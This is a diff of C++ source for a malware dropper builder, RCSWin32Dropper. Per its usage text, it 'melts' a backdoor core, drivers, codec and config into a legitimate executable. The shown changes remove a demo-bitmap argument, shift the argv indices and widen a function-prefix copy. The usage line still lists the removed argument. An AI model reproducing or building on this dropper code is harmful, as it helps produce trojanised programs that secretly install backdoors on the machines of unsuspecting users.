@@ -75,7 +75,7 @@ int main(int argc, char* argv[])
 
 		return 0;
 	}
-	if (argc != 13) {
+	if (argc != 12) {
 		printf("ERROR: \n");
 		printf("  usage:  RCSWin32Dropper.exe  <core> <core64> <conf> <driver> <driver64> <codec> <instdir> <manifest> <prefix> <demo_bitmap> <input> <output>\n\n");
 		printf("  <core> is the backdoor core\n");
@@ -88,7 +88,6 @@ int main(int argc, char* argv[])
 		printf("  <manifest> is a boolean flag for modifying the manifest\n");
 		printf("  <prefix> is the core exported function(s) name prefix\n");
 		printf("  <input> is the exe to be melted\n");
-		printf("  <demo_bitmap> is the bitmap for demo version\n");
 		printf("  <output> is the output file\n\n");
 		return 0;
 	}
@@ -121,27 +120,27 @@ int main(int argc, char* argv[])
 		sprintf(MS.codec, "%s", argv[6]);
 	}
 
-	if (strcmp(argv[10], "null")) {
-		sprintf(MS.demoBitmap, "%s", argv[10]);
-	}
+//	if (strcmp(argv[10], "null")) {
+//		sprintf(MS.demoBitmap, "%s", argv[10]);
+//	}
 
 	printf("Instdir = %s\n", argv[7]);
 	sprintf(MS.instdir, "%s", argv[7]);
-
+	
 	if (!strcmp(argv[8], "1") )
 		MS.manifest = true;
-	
+		
 	bf::path coreFile = MS.core;
 	bf::path core64File = MS.core64;
 	bf::path configFile = MS.conf;
 	bf::path driverFile = MS.driver;
 	bf::path driver64File = MS.driver64;
 	bf::path codecFile = MS.codec;
-	bf::path bitmapFile = MS.demoBitmap;
-	bf::path exeFile = argv[11];
-	bf::path outputFile = argv[12];
+	bf::path exeFile = argv[10];
+	bf::path outputFile = argv[11];
 
-	_snprintf(MS.fprefix, 6, "%s", argv[9]);
+	_snprintf(MS.fprefix, 21, "%s", argv[9]);
+
 	printf("Function Prefix: %s\n", MS.fprefix);
 	
 	/************************************************************************/
@@ -191,12 +190,14 @@ int main(int argc, char* argv[])
 		}
 	}
 
+	/*
 	if (MS.demoBitmap[0]) {
 		if ( !bf::exists(bitmapFile) ) {
 			cout << "Cannot find the demo bitmap file [" << bitmapFile << "]" << endl;
 			return ERROR_EMBEDDING;
 		}
 	}
+	*/
 
 
 	/************************************************************************/
